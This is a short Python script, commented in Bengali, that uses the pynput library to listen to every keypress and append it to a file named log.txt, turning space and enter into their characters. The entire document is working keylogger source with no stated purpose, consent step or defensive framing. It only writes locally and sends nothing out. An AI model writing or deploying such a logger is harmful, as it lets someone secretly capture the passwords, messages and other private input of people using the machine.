from pynput.keyboard import Listener

# কী-প্রেস লগ করার ফাংশন
def key_logger(key):
    key = str(key).replace("'", "")  # সিঙ্গেল কোট সরানো
    if key == 'Key.space':  
        key = ' '  # স্পেসবার চাপলে স্পেস সংযুক্ত করা
    elif key == 'Key.enter':
        key = '\n'  # এন্টার চাপলে নতুন লাইন সংযুক্ত করা

    with open("log.txt", "a") as file:
        file.write(key)

# কী-প্রেস শুনতে একটি লিসেনার তৈরি করা
with Listener(on_press=key_logger) as listener:
    listener.join()
